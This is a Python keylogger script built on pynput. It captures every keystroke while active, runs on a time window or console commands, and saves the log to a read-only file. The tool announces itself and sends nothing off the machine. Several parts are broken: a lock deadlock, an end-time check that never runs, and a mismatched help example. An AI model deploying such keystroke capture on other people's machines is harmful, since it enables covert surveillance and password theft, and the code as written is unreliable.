"""
This module implements a keylogger using  pynput library. The keylogger can start and stop logging
keystrokes based on user input. It saves logged keystrokes to a file with a specified end time for
automatic stopping. If no start or end time is provided, logging starts immediately and continues
until explicitly stopped or the end time is reached. It also ensures that log file name is unique.
"""

import argparse
import os
import threading
from datetime import datetime, timedelta
import time
from pynput import keyboard

class Keylogger:
    """
    A class to implement a keylogger that records keystrokes.
    
    The Keylogger class provides methods to start and stop logging keystrokes. It allows users to specify
    an end time for logging, automatically stopping when the end time is reached. The logged keystrokes are
    saved to a specified file with a unique name.
    """
    def __init__(self, start_time=None, end_time=None):
        """
        Initializes the Keylogger instance with default values.
        """
        self.is_logging = False
        self.log_data = []
        self.current_keys = set()
        self.log_start_time = start_time
        self.log_end_time = end_time
        self.lock = threading.Lock()

    def start_logging(self):
        """
        Starts logging keystrokes. Prompts the user to enter a start time and an end time for automatic stopping.
        """
        with self.lock:
            self.is_logging = True
            self.log_start_time = datetime.now() if not self.log_start_time else self.log_start_time
            print("Logging started...")

            # Prompt user for start time (optional)
            if self.log_start_time:
                if self.log_start_time < datetime.now():
                    self.log_start_time += timedelta(days=1)  # Adjust for start time on the next day if earlier than current time

            # Prompt user for end time (optional)
            if self.log_end_time:
                if self.log_end_time < self.log_start_time:
                    self.log_end_time += timedelta(days=1)  # Adjust for end time on the next day if earlier than start time
            else:
                self.log_end_time = self.log_start_time + timedelta(hours=1)  # Default to 1 hour if end time is not provided

    def stop_logging(self):
        """
        Stops logging keystrokes and saves the log data to a file with a unique name.
        """
        with self.lock:
            self.is_logging = False
            print("Logging stopped.")
            self.save_log()

    def save_log(self):
        """
        Saves the logged keystrokes to a file in the user-specified directory with a unique name.
        """
        while True:
            # Get the directory path from the user
            directory_path = input("Enter the directory path to save the log file: ")
            
            # Ensure the directory exists
            if not os.path.exists(directory_path):
                os.makedirs(directory_path)
            
            # Get the custom filename from the user
            file_name = input("Enter the filename for the log (without extension): ") + ".txt"
            file_path = os.path.join(directory_path, file_name)

            # Check if the file already exists
            if os.path.exists(file_path):
                print("File already exists. Please choose a different filename.")
            else:
                # Save the log file
                with open(file_path, "w", encoding='utf-8') as f:
                    f.write("".join(self.log_data))
                
                # Set the file permissions to read-only
                os.chmod(file_path, 0o444)  # Read-only for all users

                print(f"Log saved to {file_path}")
                print("Note: To edit the log file, use the command prompt and change permissions with 'chmod'.")
                self.log_data = []
                break

    def on_press(self, key):
        """
        Handles key press events. Logs the key if logging is active.

        Args:
            key: The key that was pressed.
        """
        with self.lock:
            try:
                if self.is_logging:
                    if key == keyboard.Key.space:
                        self.log_data.append(' ')  # Log space as a whitespace
                    elif key == keyboard.Key.backspace:
                        self.log_data.append('<-')  # Log backspace as '<-'
                    else:
                        self.log_data.append(key.char)
            except AttributeError:
                if self.is_logging:
                    self.log_data.append(str(key))

    def on_release(self, key):
        """
        Handles key release events.

        Args:
            key: The key that was released.
        """
        with self.lock:
            if key in self.current_keys:
                self.current_keys.remove(key)

    def check_log_time(self):
        """
        Checks if the current time has reached the end time for logging. Stops logging if time has expired.
        """
        with self.lock:
            if self.is_logging and self.log_start_time and self.log_end_time:
                current_time = datetime.now()
                if current_time >= self.log_end_time:
                    self.stop_logging()

    def start_keylogger(self):
        """
        Starts the keylogger. Listens for key events and handles logging and stopping based on user input.
        """
        print("Keylogger is ready.")
        while True:
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
            if self.is_logging:
                self.check_log_time()
            time.sleep(1)  # Sleep to prevent high CPU usage

def main():
    """
    Main function to handle command-line arguments and manage the keylogger.

    Parses command-line arguments for start and end times, initializes the Keylogger
    with the specified parameters, and manages the keylogger's operation based on user input.
    """
    parser = argparse.ArgumentParser(description='Keylogger CLI for capturing & logging keystrokes.',
        epilog='''Examples:
        keylogger --start-time 14:00 --time 15:00
        keylogger --help
        ''''Keylogger command-line interface.')
    parser.add_argument('--start-time', type=str, help='Specify the start time for logging in HH:MM 24-hour format.')
    parser.add_argument('--end-time', type=str, help='Specify the end time for logging in HH:MM 24-hour format.')
    args = parser.parse_args()
    
    # Convert start time and end time to datetime objects
    start_time = None
    end_time = None

    if args.start_time:
        try:
            start_time = datetime.strptime(args.start_time, '%H:%M').time()
            now = datetime.now()
            start_datetime = datetime.combine(now.date(), start_time)
            if start_datetime < now:
                start_datetime += timedelta(days=1)
            start_time = start_datetime
        except ValueError:
            print("Invalid time format for start time. Please use HH:MM format.")

    if args.end_time:
        try:
            end_time = datetime.strptime(args.end_time, '%H:%M').time()
            now = datetime.now()
            end_datetime = datetime.combine(now.date(), end_time)
            if end_datetime < now:
                end_datetime += timedelta(days=1)
            end_time = end_datetime
        except ValueError:
            print("Invalid time format for end time. Please use HH:MM format.")

    keylogger = Keylogger(start_time=start_time, end_time=end_time)
    keylogger_thread = threading.Thread(target=keylogger.start_keylogger, daemon=True)
    keylogger_thread.start()

    try:
        while True:
            command = input("Enter 'start' to start logging, 'stop' to stop logging, or 'exit' to exit: ")
            if command == 'start':
                if not keylogger.is_logging:
                    keylogger.start_logging()
            elif command == 'stop':
                if keylogger.is_logging:
                    keylogger.stop_logging()
            elif command == 'exit':
                if keylogger.is_logging:
                    keylogger.stop_logging()
                break
    except KeyboardInterrupt:
        if keylogger.is_logging:
            keylogger.stop_logging()

if __name__ == "__main__":
    main()
